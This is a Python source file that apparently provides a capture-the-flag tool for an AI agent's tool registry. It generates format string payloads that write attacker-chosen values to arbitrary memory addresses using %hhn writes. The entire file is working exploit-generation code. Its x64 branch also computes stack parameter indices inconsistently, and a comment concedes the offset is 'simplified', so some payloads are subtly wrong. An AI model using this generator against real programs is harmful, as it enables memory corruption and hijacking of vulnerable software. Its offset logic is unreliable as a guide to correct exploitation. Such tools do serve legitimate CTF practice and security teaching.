"""Format string exploit tool: generate payloads for arbitrary write.

Provides both a standalone function ``format_string_exploit(...)`` and a
registered ``FormatStringTool`` class for use in the tool registry.
"""
from __future__ import annotations

import struct
from typing import Any, Dict, List

from ..base import BaseTool, ToolResult, register


def _pack_address(addr: int, arch: str) -> bytes:
    """Pack an address into bytes based on architecture."""
    if arch in ("x64", "amd64", "x86_64"):
        return struct.pack("<Q", addr)
    else:  # x86, i386
        return struct.pack("<I", addr)


def _addr_size(arch: str) -> int:
    """Return address size in bytes for the architecture."""
    if arch in ("x64", "amd64", "x86_64"):
        return 8
    return 4


def format_string_exploit(
    offset: int,
    target_addr: int,
    value: int,
    arch: str = "x64",
) -> dict:
    """Generate a format string payload for arbitrary write.

    Uses the %n format specifier technique to write an arbitrary value
    to a target address. Splits the write into byte-sized or word-sized
    chunks depending on architecture.

    Args:
        offset: Stack offset where the format string buffer starts
            (determined by sending %p patterns).
        target_addr: Memory address to write to.
        value: Value to write at the target address.
        arch: Target architecture ('x64', 'x86', 'amd64', 'i386').
            Defaults to 'x64'.

    Returns:
        Dictionary with keys:
        - payload: bytes - the generated format string payload
        - explanation: str - human-readable explanation of the payload
        - writes: List[dict] - individual write operations performed
    """
    if offset < 1:
        return {
            "payload": b"",
            "explanation": "Invalid offset: must be >= 1",
            "writes": [],
            "error": "invalid_offset",
        }

    if target_addr < 0:
        return {
            "payload": b"",
            "explanation": "Invalid target address: must be >= 0",
            "writes": [],
            "error": "invalid_address",
        }

    addr_size = _addr_size(arch)
    is_64bit = addr_size == 8

    # Strategy: write value byte-by-byte using %hhn (write single byte)
    # This is the most reliable approach for format string exploits
    writes: List[Dict[str, Any]] = []
    payload_parts: List[bytes] = []
    explanation_lines: List[str] = []

    explanation_lines.append(
        f"Format string arbitrary write: writing 0x{value:x} to 0x{target_addr:x}"
    )
    explanation_lines.append(f"Architecture: {arch} ({addr_size * 8}-bit)")
    explanation_lines.append(f"Stack offset: {offset}")
    explanation_lines.append("")

    # Determine how many bytes to write (up to addr_size bytes of value)
    # We write byte-by-byte using %hhn for reliability
    num_bytes = addr_size
    byte_values = []
    for i in range(num_bytes):
        byte_val = (value >> (i * 8)) & 0xFF
        byte_values.append(byte_val)
        # Only write up to the significant bytes
        if i >= 4 and all(b == 0 for b in byte_values[i:]):
            break

    # Trim trailing zero bytes for efficiency (but keep at least 1)
    while len(byte_values) > 1 and byte_values[-1] == 0:
        byte_values.pop()

    num_writes = len(byte_values)

    # Build the payload
    # Layout for x64: addresses go AFTER the format specifiers (to avoid null bytes)
    # Layout for x86: addresses go BEFORE the format specifiers

    if is_64bit:
        # x64: format specifiers first, then addresses at the end
        # Calculate the offset adjustment for addresses placed after format specs
        # Each %NNc%NN$hhn is roughly 10-15 bytes
        fmt_parts: List[str] = []
        addr_parts: List[bytes] = []

        # We need to calculate where addresses will be on the stack
        # The addresses are appended after the format string
        # Each address takes 8 bytes on x64
        # The format string itself occupies stack space

        printed_so_far = 0
        for i in range(num_writes):
            target_byte = byte_values[i]
            write_addr = target_addr + i

            # Calculate how many chars to print to reach target_byte
            needed = (target_byte - printed_so_far) % 256
            # The parameter index for this address
            # Addresses are placed after the format string on the stack
            param_idx = offset + num_writes + i  # simplified; real offset depends on layout

            if needed == 0:
                fmt_parts.append(f"%{offset + i}$hhn")
            else:
                fmt_parts.append(f"%{needed}c%{offset + i}$hhn")
                printed_so_far = (printed_so_far + needed) % 256

            addr_parts.append(_pack_address(write_addr, arch))

            writes.append({
                "address": f"0x{write_addr:x}",
                "value": f"0x{target_byte:02x}",
                "byte_index": i,
                "format_spec": fmt_parts[-1],
            })

            explanation_lines.append(
                f"  Write 0x{target_byte:02x} to 0x{write_addr:x} using {fmt_parts[-1]}"
            )

        # Combine: format string + padding + addresses
        fmt_str = "".join(fmt_parts).encode("ascii")
        # Pad to align addresses
        padding_needed = (addr_size - (len(fmt_str) % addr_size)) % addr_size
        fmt_str += b"A" * padding_needed

        payload = fmt_str + b"".join(addr_parts)

    else:
        # x86: addresses first, then format specifiers
        addr_parts_x86: List[bytes] = []
        fmt_parts_x86: List[str] = []

        printed_so_far = num_writes * addr_size  # addresses already printed chars
        for i in range(num_writes):
            target_byte = byte_values[i]
            write_addr = target_addr + i

            addr_parts_x86.append(_pack_address(write_addr, arch))

            # Calculate chars needed
            needed = (target_byte - printed_so_far) % 256
            param_idx = offset + i

            if needed == 0:
                fmt_parts_x86.append(f"%{param_idx}$hhn")
            else:
                fmt_parts_x86.append(f"%{needed}c%{param_idx}$hhn")
                printed_so_far = (printed_so_far + needed) % 256

            writes.append({
                "address": f"0x{write_addr:x}",
                "value": f"0x{target_byte:02x}",
                "byte_index": i,
                "format_spec": fmt_parts_x86[-1],
            })

            explanation_lines.append(
                f"  Write 0x{target_byte:02x} to 0x{write_addr:x} using {fmt_parts_x86[-1]}"
            )

        payload = b"".join(addr_parts_x86) + "".join(fmt_parts_x86).encode("ascii")

    explanation_lines.append("")
    explanation_lines.append(f"Total payload length: {len(payload)} bytes")
    explanation_lines.append(f"Number of writes: {num_writes}")

    return {
        "payload": payload,
        "explanation": "\n".join(explanation_lines),
        "writes": writes,
    }


@register
class FormatStringTool(BaseTool):
    """Generate format string exploit payloads for arbitrary memory writes."""

    category = "ctf_pwn"

    @property
    def name(self) -> str:
        return "format_string"

    @property
    def description(self) -> str:
        return (
            "Generate format string exploit payload for arbitrary write. "
            "Uses %hhn technique to write byte-by-byte to a target address. "
            "Requires knowing the stack offset (found via %p leak)."
        )

    def parameters_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "offset": {
                    "type": "integer",
                    "description": "Stack offset where format string buffer starts",
                },
                "target_addr": {
                    "type": "integer",
                    "description": "Memory address to write to (as integer)",
                },
                "value": {
                    "type": "integer",
                    "description": "Value to write at the target address",
                },
                "arch": {
                    "type": "string",
                    "description": "Target architecture (x64, x86, amd64, i386)",
                    "default": "x64",
                },
            },
            "required": ["offset", "target_addr", "value"],
        }

    def _run(self, **kwargs: Any) -> ToolResult:
        offset = kwargs.get("offset")
        target_addr = kwargs.get("target_addr")
        value = kwargs.get("value")
        arch = kwargs.get("arch", "x64")

        if offset is None or target_addr is None or value is None:
            return ToolResult(
                success=False,
                tool=self.name,
                summary="offset, target_addr, and value are required",
                error="missing_args",
            )

        try:
            offset = int(offset)
            target_addr = int(target_addr)
            value = int(value)
        except (ValueError, TypeError) as e:
            return ToolResult(
                success=False,
                tool=self.name,
                summary=f"Invalid parameter type: {e}",
                error="invalid_args",
            )

        result = format_string_exploit(offset, target_addr, value, arch)

        if "error" in result:
            return ToolResult(
                success=False,
                tool=self.name,
                summary=result["explanation"],
                error=result["error"],
            )

        payload_hex = result["payload"].hex()
        return ToolResult(
            success=True,
            tool=self.name,
            summary=f"Generated format string payload ({len(result['payload'])} bytes) "
                    f"to write 0x{value:x} at 0x{target_addr:x}",
            raw_output=result["explanation"],
            parsed_data={
                "payload_hex": payload_hex,
                "payload_length": len(result["payload"]),
                "writes": result["writes"],
                "arch": arch,
                "offset": offset,
                "target_addr": f"0x{target_addr:x}",
                "value": f"0x{value:x}",
            },
        )
